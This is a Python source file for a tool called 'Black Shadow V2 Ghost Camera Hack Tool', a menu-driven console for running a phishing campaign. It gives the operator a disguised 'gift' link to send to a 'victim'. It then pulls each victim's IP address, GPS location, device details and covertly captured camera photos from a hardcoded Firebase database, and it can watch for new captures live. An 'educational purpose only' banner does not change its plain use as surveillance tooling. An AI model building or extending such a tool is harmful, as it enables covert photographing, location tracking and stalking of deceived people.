#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                         💀 BLACK SHADOW V2 💀                            ║
║                     👻 Ghost Camera Hack Tool 👻                         ║
║                           🔥 DANGER TOOL 🔥                              ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                     Developed by: ADITYA                                 ║
║                     Educational Purpose Only                             ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import requests
import subprocess
from datetime import datetime

# Colors
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[94m'
M = '\033[95m'
W = '\033[97m'
S = '\033[0m'
BL = '\033[1m'

# Config
FIREBASE_URL = "https://website-by-aditya-das-default-rtdb.firebaseio.com/claims.json"
GIFT_LINK = "https://phenomenal-bienenstitch-e3188e.netlify.app/"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""{R}{BL}
╔═══════════════════════════════════════════════════════════════════════════╗
║                         💀 BLACK SHADOW V2 💀                            ║
║                     👻 Ghost Camera Hack Tool 👻                         ║
║                           🔥 DANGER TOOL 🔥                              ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                     Developed by: {W}{BL}ADITYA{R}{BL}                               ║
║                     Educational Purpose Only                             ║
╚═══════════════════════════════════════════════════════════════════════════╝{S}
""")

def fetch_captures():
    try:
        response = requests.get(FIREBASE_URL)
        if response.status_code == 200:
            return response.json() or {}
        return {}
    except:
        return {}

def show_captures():
    data = fetch_captures()
    if not data:
        print(f"\n{R}❌ NO CAPTURES YET!{S}")
        print(f"{Y}💡 Send the link to victim first!{S}")
        input(f"\n{C}[Press Enter to continue...]{S}")
        return
    
    items = []
    for key, val in data.items():
        photos = val.get("photoUrls", []) or ([val.get("photoUrl")] if val.get("photoUrl") else [])
        items.append({
            "ip": val.get("ip", "Unknown"),
            "lat": val.get("location", {}).get("lat") if val.get("location") else None,
            "lng": val.get("location", {}).get("lng") if val.get("location") else None,
            "photos": photos,
            "time": val.get("timestamp", "Unknown")[:19],
            "device": val.get("screenSize", "Unknown")
        })
    
    items.sort(key=lambda x: x["time"], reverse=True)
    
    print(f"\n{R}{BL}{'='*70}{S}")
    print(f"{G}{BL}💀 TOTAL VICTIMS: {len(items)} 💀{S}")
    print(f"{R}{BL}{'='*70}{S}\n")
    
    for i, item in enumerate(items):
        print(f"{Y}{BL}[{i+1}]{S} 🕐 {item['time']}")
        print(f"   🌐 IP: {item['ip']}")
        print(f"   📱 Device: {item['device']}")
        
        if item['lat']:
            print(f"   📍 Location: {item['lat']}, {item['lng']}")
            print(f"   🗺️ Maps: https://maps.google.com?q={item['lat']},{item['lng']}")
        else:
            print(f"   📍 Location: Not available")
        
        if item['photos']:
            print(f"   📸 Photos: {len(item['photos'])} captured")
            for idx, url in enumerate(item['photos'][:2]):
                print(f"      📷 {url[:60]}...")
        else:
            print(f"   📸 Photos: No photos")
        
        print(f"{C}{'─'*70}{S}")
    
    input(f"\n{C}[Press Enter to continue...]{S}")

def show_photos_only():
    data = fetch_captures()
    if not data:
        print(f"\n{R}❌ No photos yet!{S}")
        input(f"\n{C}[Press Enter to continue...]{S}")
        return
    
    print(f"\n{G}{BL}📸 CAPTURED PHOTOS{S}")
    print(f"{C}{'='*60}{S}")
    
    count = 0
    for key, val in data.items():
        photos = val.get("photoUrls", []) or ([val.get("photoUrl")] if val.get("photoUrl") else [])
        if photos:
            print(f"\n{Y}📅 {val.get('timestamp', 'Unknown')[:19]}{S}")
            for url in photos:
                count += 1
                print(f"   {G}[{count}] 📷 {url}{S}")
    
    if count == 0:
        print(f"\n{Y}⚠️ No photos captured yet!{S}")
    
    input(f"\n{C}[Press Enter to continue...]{S}")

def show_stats():
    data = fetch_captures()
    if not data:
        print(f"\n{Y}⚠️ No data yet!{S}")
        input(f"\n{C}[Press Enter to continue...]{S}")
        return
    
    total = len(data)
    with_photo = 0
    with_loc = 0
    total_photos = 0
    
    for key, val in data.items():
        photos = val.get("photoUrls", []) or ([val.get("photoUrl")] if val.get("photoUrl") else [])
        if photos:
            with_photo += 1
            total_photos += len(photos)
        if val.get("location") and val.get("location").get("lat"):
            with_loc += 1
    
    print(f"\n{R}{BL}{'='*50}{S}")
    print(f"{G}{BL}💀 BLACK SHADOW STATS 💀{S}")
    print(f"{R}{BL}{'='*50}{S}")
    print(f"{Y}👥 Total Victims: {R}{BL}{total}{S}")
    print(f"{Y}📸 With Photos: {G}{with_photo}{S}")
    print(f"{Y}🖼️ Total Photos: {G}{total_photos}{S}")
    print(f"{Y}📍 With Location: {G}{with_loc}{S}")
    print(f"{R}{BL}{'='*50}{S}")
    
    input(f"\n{C}[Press Enter to continue...]{S}")

def show_link():
    """Show link and stay there until user presses Enter"""
    clear_screen()
    banner()
    
    print(f"\n{R}{BL}{'='*70}{S}")
    print(f"{G}{BL}💀 SEND THIS LINK TO VICTIM 💀{S}")
    print(f"{R}{BL}{'='*70}{S}")
    print(f"\n{C}{GIFT_LINK}{S}\n")
    print(f"{Y}📌 Instructions:{S}")
    print(f"   1️⃣ Send this link to victim")
    print(f"   2️⃣ Victim sees GIFT page")
    print(f"   3️⃣ Victim allows camera")
    print(f"   4️⃣ Photos + Location captured")
    print(f"   5️⃣ Data appears in this tool")
    print(f"\n{R}⚠️ LINK EXPIRES IN 20 MINUTES!{S}")
    print(f"\n{Y}💡 To copy link: Select and copy{S}")
    print(f"{R}{BL}{'='*70}{S}")
    
    # Wait here - won't go back to menu automatically
    input(f"\n{G}✅ Press Enter to continue...{S}")

def live_monitor():
    print(f"\n{R}{BL}{'='*70}{S}")
    print(f"{G}{BL}🔴 LIVE MONITOR MODE 🔴{S}")
    print(f"{Y}Press Ctrl+C to stop{S}")
    print(f"{R}{BL}{'='*70}{S}\n")
    
    last_count = 0
    try:
        while True:
            data = fetch_captures()
            current = len(data) if data else 0
            
            if current > last_count:
                print(f"\n{R}{BL}[!] NEW CAPTURE! Total: {current}{S}")
                last_count = current
                # Show only new capture quickly
                for key, val in (data or {}).items():
                    if val.get('timestamp'):
                        print(f"   🕐 {val.get('timestamp', '')[:19]}")
                        print(f"   🌐 IP: {val.get('ip', 'Unknown')}")
                        break
            else:
                print(f"{C}[{datetime.now().strftime('%H:%M:%S')}] 💀 Monitoring... {current} victims{S}", end="\r")
            
            time.sleep(3)
    except KeyboardInterrupt:
        print(f"\n\n{G}✅ Monitor stopped{S}")
        input(f"\n{C}[Press Enter to continue...]{S}")

def delete_all():
    print(f"\n{R}{BL}⚠️ WARNING: This will delete ALL captured data!{S}")
    confirm = input(f"{Y}[?] Type 'DELETE' to confirm: {S}")
    
    if confirm == "DELETE":
        try:
            requests.delete(FIREBASE_URL.replace('.json', '.json?print=pretty'))
            print(f"{G}✅ All data deleted!{S}")
        except:
            print(f"{R}❌ Delete failed!{S}")
    else:
        print(f"{R}❌ Cancelled{S}")
    
    input(f"\n{C}[Press Enter to continue...]{S}")

def main():
    clear_screen()
    banner()
    print(f"{R}{BL}⚠️  EDUCATIONAL PURPOSE ONLY! Use on your own accounts.{S}\n")
    
    while True:
        print(f"\n{R}{BL}{'='*60}{S}")
        print(f"{G}{BL}{' ' * 22}💀 MENU 💀{S}")
        print(f"{R}{BL}{'='*60}{S}")
        print(f"{G}[1]{S} 👥 Show All Victims")
        print(f"{G}[2]{S} 📸 Show Photos Only")
        print(f"{G}[3]{S} 📊 Show Statistics")
        print(f"{G}[4]{S} 🔗 Get Victim Link")
        print(f"{G}[5]{S} 🔴 Live Monitor")
        print(f"{G}[6]{S} 🗑️ Delete All Data")
        print(f"{G}[7]{S} 🚪 Exit")
        print(f"{R}{BL}{'='*60}{S}")
        
        choice = input(f"{Y}[?] Select option: {S}")
        
        if choice == "1":
            show_captures()
        elif choice == "2":
            show_photos_only()
        elif choice == "3":
            show_stats()
        elif choice == "4":
            show_link()  # This stays on link screen, no auto return
        elif choice == "5":
            live_monitor()
        elif choice == "6":
            delete_all()
        elif choice == "7":
            print(f"\n{G}✅ Thank you for using BLACK SHADOW!{S}")
            print(f"{C}👻 Developed by ADITYA{S}\n")
            sys.exit(0)
        else:
            print(f"{R}❌ Invalid option!{S}")
            time.sleep(1)

if __name__ == "__main__":
    main()